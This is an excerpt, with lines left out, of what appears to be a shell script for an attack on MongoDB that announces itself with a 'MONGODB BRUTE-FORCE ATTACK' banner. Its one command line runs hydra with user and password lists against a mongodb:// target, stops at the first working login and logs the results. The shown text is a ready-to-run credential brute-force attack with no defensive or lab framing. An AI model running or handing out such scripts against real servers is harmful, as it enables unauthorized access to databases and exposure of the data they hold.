...
# ═══════════════════════════════════════════════════════════════════
# MONGODB BRUTE-FORCE - ONE LINE CHANGE
# ═══════════════════════════════════════════════════════════════════
...
echo "════════════════════════════════════════════════════════"
echo "  MONGODB BRUTE-FORCE ATTACK"
...
# Execute attack
hydra -L "$USERLIST" -P "$PASSLIST" -t "$THREADS" -f mongodb://"$TARGET:$PORT" | tee -a "$PROJECT_ROOT/logs/mongodb_attack.log"
